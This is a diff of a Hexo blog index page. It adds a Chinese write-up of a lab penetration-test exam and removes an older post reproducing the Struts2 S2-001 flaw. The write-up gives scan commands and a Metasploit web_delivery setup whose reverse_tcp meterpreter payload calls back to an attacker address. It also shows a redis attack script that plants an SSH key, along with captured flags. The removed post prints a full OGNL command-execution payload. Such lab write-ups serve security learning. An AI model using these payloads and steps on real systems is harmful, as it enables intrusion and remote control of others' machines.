@@ -69,6 +69,164 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-weekn_kls_exam" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/03/01/weekn_kls_exam/" class="article-date">
+  <time class="dt-published" datetime="2025-03-01T08:54:35.000Z" itemprop="datePublished">2025-03-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/exam/">exam</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/03/01/weekn_kls_exam/">weekn_kls_exam</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2><span id="写在前面">写在前面</span></h2><p>127.0.0.1假装是dmz</p>
+<p>192.168.2.183假装是外网ip</p>
+<p>假装内网主机可以出网</p>
+<p>不可出网状态下，thinkphp需手动攻击，redis上传公钥也要手动攻击。部分shell的获取需要通过正向连接获取</p>
+<p>pp是对proxychains的alias</p>
+<p>j8是对java8的alias</p>
+<p>攻击机不通90网段</p>
+<p>需手动删除路由表</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo route del -net 192.168.90.0 netmask 255.255.255.0 dev br-f9cc65027665</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/image_1740817260821_0.png" alt="image.png"></p>
+<p>反连时需恢复路由表</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo route add -net 192.168.90.0 netmask 255.255.255.0 dev br-f9cc65027665</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/image_1740818300342_0.png" alt="image.png"></p>
+<h2><span id="dmz信息收集">DMZ信息收集</span></h2><p>靶场搭建起来后对靶机进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kscan -t 127.0.0.1 -p 0-65535</span><br></pre></td></tr></table></figure>
+
+<p>可用端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:80                                       Port:80,Addr:本机地址,Digest:00\&quot;,\&quot;status\&quot;:404,\&quot;er,Length:250</span><br><span class="line">http://127.0.0.1:9090                                     Digest:&quot;\r\n&lt;html&gt;\n&lt;head&gt;&lt;titl,Length:285,Port:9090,Addr:本机地址,FingerPrint:JSP;JAVA;OpenfireAdminConsole</span><br><span class="line">http://127.0.0.1:8983          SolrAdmin                  Digest:href=\&quot;css/angular/strea,Length:16998,Port:8983,Addr:本机地址,FingerPrint:apacheSolr;JQuery;ApacheSolr,FoundDomain:www.w3.org、www.apache.org、collection.name、currentCollection.name、core.name、currentCore.name、lucene.apache.org、issues.apache.org、webchat.freenode.net、wiki.apache.org</span><br></pre></td></tr></table></figure>
+
+<p>访问一下看看都是些什么</p>
+<p>80</p>
+<p>空页面没啥东西</p>
+<p>9090</p>
+<p><img src="/../assets/image_1740807947130_0.png" alt="image.png"></p>
+<p>8983</p>
+<p><img src="/../assets/image_1740808020082_0.png" alt="image.png"></p>
+<h2><span id="dmz漏洞扫描amp利用">DMZ漏洞扫描&amp;利用</span></h2><h3><span id="先梭哈">先梭哈</span></h3><p>使用nuclei</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./nuclei -list ~/exam/port</span><br></pre></td></tr></table></figure>
+
+<p><code>~/exam/port</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://127.0.0.1:9090</span><br><span class="line">http://127.0.0.1:8983</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果</p>
+<p><img src="/../assets/image_1740807717870_0.png" alt="image.png"></p>
+<h3><span id="spring-80">spring 80</span></h3><p>下载并分析该heapdump</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">j8 -jar JDumpSpider-1.1-SNAPSHOT-full.jar ~/exam/heapdump &gt; ~/exam/heapdump_result</span><br></pre></td></tr></table></figure>
+
+<p>提取可用信息</p>
+<p><img src="/../assets/image_1740808099548_0.png" alt="image.png"></p>
+<p>java.version &#x3D; 1.8.0_432</p>
+<h3><span id="openfire-9090">openfire 9090</span></h3><p>尝试yakit中扫描漏洞,无果</p>
+<p>msf中寻找其相关漏洞</p>
+<p>发现rce模块，尝试检查漏洞</p>
+<p><img src="/../assets/image_1740809067169_0.png" alt="image.png"></p>
+<p>配置好参数，尝试利用</p>
+<p><img src="/../assets/image_1740809121348_0.png" alt="image.png"></p>
+<p>利用成功</p>
+<p><img src="/../assets/image_1740809171093_0.png" alt="image.png"></p>
+<h3><span id="solr-8983">solr 8983</span></h3><p>使用msf扫描log4j2</p>
+<p><img src="/../assets/image_1740810404211_0.png" alt="image.png"></p>
+<p>发现log4j2</p>
+<p>利用</p>
+<p><img src="/../assets/image_1740811862167_0.png" alt="image.png"></p>
+<p>成功反弹shell，通过webdelivery 上线msf</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set target Linux</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.2.183</span><br><span class="line">set SRVPORT 4577</span><br><span class="line">set LPORT 4331</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/image_1740812092137_0.png" alt="image.png"></p>
+<h2><span id="openfire作为入口点进行内网渗透">openfire作为入口点进行内网渗透</span></h2><h3><span id="信息收集">信息收集</span></h3><p>查看网卡信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : eth0 - eth0</span><br><span class="line">Hardware MAC : 46:86:07:b8:b0:96</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 172.16.238.20</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">Interface  2</span><br><span class="line">============</span><br><span class="line">Name         : lo - lo</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 65536</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br></pre></td></tr></table></figure>
+
+<p>上传工具进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[2025-03-01 06:10:20] [SUCCESS] 端口开放 172.16.238.35:80</span><br><span class="line">[2025-03-01 06:10:20] [SUCCESS] 端口开放 172.16.238.20:7070</span><br><span class="line">[2025-03-01 06:10:20] [SUCCESS] 端口开放 172.16.238.20:7777</span><br><span class="line">[2025-03-01 06:10:20] [SUCCESS] 端口开放 172.16.238.99:8983</span><br><span class="line">[2025-03-01 06:10:20] [SUCCESS] 端口开放 172.16.238.20:9090</span><br></pre></td></tr></table></figure>
+
+<p>过滤重复内容，端口开放信息如下</p>
+<p><code>172.16.238.35:80</code></p>
+<p><code>172.16.238.20:7070</code></p>
+<p><code>172.16.238.20:7777</code></p>
+<h3><span id="上传代理工具进行代理">上传代理工具进行代理</span></h3><p><img src="/../assets/image_1740812905579_0.png" alt="image.png"></p>
+<h3><span id="内网漏洞扫描amp利用">内网漏洞扫描&amp;利用</span></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pp ./nuclei -list ~/exam/nuclei_list_172.16.238.0</span><br></pre></td></tr></table></figure>
+
+<p>非常安全，没有漏洞。</p>
+<p>7070端口</p>
+<p><img src="/../assets/image_1740814134484_0.png" alt="image.png"></p>
+<p>和openfire相关的，结束</p>
+<p>扫描结束后发现</p>
+<p>135为springboot信息泄漏的机器</p>
+<p>99为solr机器</p>
+<p>20为该主机</p>
+<h2><span id="solr作入口">solr作入口</span></h2><h3><span id="信息收集">信息收集</span></h3><p>网卡信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : lo</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 65536</span><br><span class="line">Flags        : UP,LOOPBACK</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line">Interface  2</span><br><span class="line">============</span><br><span class="line">Name         : eth0</span><br><span class="line">Hardware MAC : d6:9e:76:c3:32:ca</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 172.16.238.99</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">Interface  3</span><br><span class="line">============</span><br><span class="line">Name         : eth1</span><br><span class="line">Hardware MAC : fa:f7:c7:eb:07:4d</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.90.4</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br></pre></td></tr></table></figure>
+
+<p>上传工具进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.90.80:80</span><br><span class="line">192.168.90.45:80</span><br><span class="line">192.168.90.30:22</span><br><span class="line">192.168.90.30:6379</span><br><span class="line">192.168.90.30:9999</span><br></pre></td></tr></table></figure>
+
+<h3><span id="代理搭建">代理搭建</span></h3><p><img src="/../assets/image_1740815677553_0.png" alt="image.png"></p>
+<h3><span id="漏洞扫描">漏洞扫描</span></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pp ./nuclei -list ~/exam/nuclei_list_192.168.90.0</span><br></pre></td></tr></table></figure>
+
+<p>不知道nuclei拉了还是代理拉了，没扫到</p>
+<h3><span id="手动利用">手动利用</span></h3><h4><span id="1921689030-redis未授权访问">192.168.90.30 redis未授权访问</span></h4><p>敏感文件：</p>
+<p><img src="/../assets/image_1740815730826_0.png" alt="image.png"></p>
+<p><img src="/../assets/image_1740815765596_0.png" alt="image.png"></p>
+<p>和spring泄漏的一致</p>
+<p>利用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pp python redis-attack.py -r 192.168.90.30 -L 192.168.2.183 -P 4889 -a 666666 -lf3 ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
+
+<p>上传公钥</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pp ssh root@192.168.90.30  -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/image_1740816869228_0.png" alt="image.png"></p>
+<p>上线到msf</p>
+<p>web_delivery</p>
+<h4><span id="1921689080-thinkphp-rce">192.168.90.80 thinkphp rce</span></h4><p>直接利用rce</p>
+<p><img src="/../assets/image_1740817966297_0.png" alt="image.png"></p>
+<h2><span id="flag">flag</span></h2><p>dmz80端口,heapdump泄漏 192.168.90.45:80，172.16.238.35:80</p>
+<p><code>flag&#123;975948af-22da-4dea-a783-c2132f06b287&#125;</code></p>
+<p>dmz9090端口，openfire命令执行漏洞 172.16.238.20:9090</p>
+<p><code>flag&#123;8c6cad22-e797-4295-83d6-e7ab0a0616fa&#125;</code></p>
+<p>dmz8983, solr log4j2反序列化</p>
+<p><code>flag&#123;c072f21d-83a4-48c9-b04a-2f483b13aa86&#125;</code></p>
+<p>192.168.90.30, redis密码泄漏，ssh写公钥</p>
+<p><code>flag&#123;4d664237-4256-4520-af60-421899e7b79c&#125;</code></p>
+<p>192.168.90.80,thinkphp rce</p>
+<p><code>flag&#123;a42d9a3c-1a65-4cd3-9b3b-6b3e549eef03&#125;</code></p>
+<h2><span id="shell">shell</span></h2><p><img src="/../assets/image_1740818042355_0.png" alt="image.png">{:height 127, :width 749}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/03/01/weekn_kls_exam/" data-id="cm7pyum3w000040iw5gql2zg0" data-title="weekn_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-linux下微信小程序抓包" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/02/11/linux%E4%B8%8B%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85/" class="article-date">
@@ -632,61 +790,6 @@
 
 
   
-    <article id="post-s2-001OGNL命令执行" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/25/s2-001OGNL%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
-  <time class="dt-published" datetime="2025-01-24T16:49:26.000Z" itemprop="datePublished">2025-01-25</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/25/s2-001OGNL%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">s2-001OGNL命令执行</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2><span id="概述">概述</span></h2><h3><span id="产生原因">产生原因</span></h3><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 <code>%&#123;value&#125;</code> 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
-<h3><span id="影响">影响</span></h3><p>参考链接1</p>
-<h2><span id="环境搭建">环境搭建</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd struts2/s2-001</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<h2><span id="复现">复现</span></h2><p>抓取登陆包</p>
-<p>构造执行<code>ls -a</code>的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=%25&#123;%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]&#123;&quot;ls&quot;,&quot;-a&quot;&#125;)).redirectErrorStream(true).start(),%23b%3d%23a.getInputStream(),%23c%3dnew+java.io.InputStreamReader(%23b),%23d%3dnew+java.io.BufferedReader(%23c),%23e%3dnew+char[50000],%23d.read(%23e),%23f%3d%23context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),%23f.getWriter().println(new+java.lang.String(%23e)),%23f.getWriter().flush(),%23f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../assets/image_1737737297331_0.png" alt="image.png"></p>
-<h2><span id="攻防">攻防</span></h2><h3><span id="利用">利用</span></h3><p><a target="_blank" rel="noopener" href="https://github.com/xfiftyone/STS2G">GitHub xfiftyone&#x2F;STS2G: Struts2漏洞扫描利用工具 Golang版. Struts2 Scanner Written in Golang</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/HatBoy/Struts2-Scan">GitHub HatBoy&#x2F;Struts2-Scan: Struts2全漏洞扫描利用工具</a></p>
-<h3><span id="防御">防御</span></h3><p>升级Struts到2.0.9或升级XWork到2.0.4</p>
-<h2><span id="参考">参考</span></h2><p><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-001">S2-001 Apache Struts 2 Wiki Apache Software Foundation</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/25/s2-001OGNL%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cm6z08oqv0029y1iw0xgngnqf" data-title="s2-001OGNL命令执行" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -731,7 +834,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">March 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li></ul>
     </div>
   </div>
 
@@ -742,6 +845,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/03/01/weekn_kls_exam/">weekn_kls_exam</a>
+          </li>
         
           <li>
             <a href="/2025/02/11/linux%E4%B8%8B%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85/">linux下微信小程序抓包</a>
@@ -757,10 +864,6 @@
         
           <li>
             <a href="/2025/01/28/s2-013%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">s2-013命令执行</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/26/s2-009%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">s2-009命令执行</a>
           </li>
         
       </ul>
